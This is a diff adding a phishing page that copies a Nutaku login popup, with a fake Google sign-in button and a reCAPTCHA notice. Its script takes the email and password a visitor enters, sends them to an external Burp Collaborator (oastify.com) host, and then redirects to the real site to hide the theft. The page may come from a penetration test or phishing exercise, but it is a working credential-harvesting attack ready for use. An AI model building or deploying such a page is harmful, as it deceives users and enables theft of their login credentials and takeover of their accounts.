@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Nutaku Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: url('nutaku.png') no-repeat center center;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+    }
+
+    .login-popup {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #1c1f2a;
+      width: 320px;
+      border-radius: 15px;
+      padding: 20px;
+      color: white;
+      box-shadow: 0 0 20px rgba(0,0,0,0.7);
+    }
+
+    .login-popup h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #ffffff;
+    }
+
+    .google-btn {
+      background-color: #ffffff;
+      color: #333;
+      font-weight: bold;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .google-btn img {
+      height: 20px;
+      margin-right: 10px;
+    }
+
+    .separator {
+      text-align: center;
+      color: #aaa;
+      margin: 10px 0;
+      position: relative;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background: #444;
+    }
+
+    .separator::before {
+      left: 0;
+    }
+
+    .separator::after {
+      right: 0;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 5px;
+      background-color: #2b2f3d;
+      color: white;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #1e9fff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      margin-top: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .footer {
+      font-size: 12px;
+      text-align: center;
+      margin-top: 10px;
+      color: #888;
+    }
+
+    .footer a {
+      color: #1e9fff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-popup">
+    <h2>Login and Play Now</h2>
+    <button class="google-btn">
+      <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google Logo">
+      Login with Google
+    </button>
+
+    <div class="separator">OR</div>
+
+    <form id="fake-login">
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button class="login-btn" type="submit">Login</button>
+    </form>
+
+    <div class="footer">
+      <a href="#">Forgot password?</a><br>
+      This site is protected by reCAPTCHA and the Google<br>
+      <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a><br><br>
+      Don’t have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('fake-login').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.querySelector('input[name="email"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      // Send HTTP request to Burp Collaborator
+      fetch('https://xhid922z4v4ad521qrb20z3pzg57txhm.oastify.com/?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
+
+      setTimeout(() => {
+        window.location.href = 'https://www.nutaku.com/';
+      }, 1500);
+    });
+  </script>
+
+</body>
+</html>
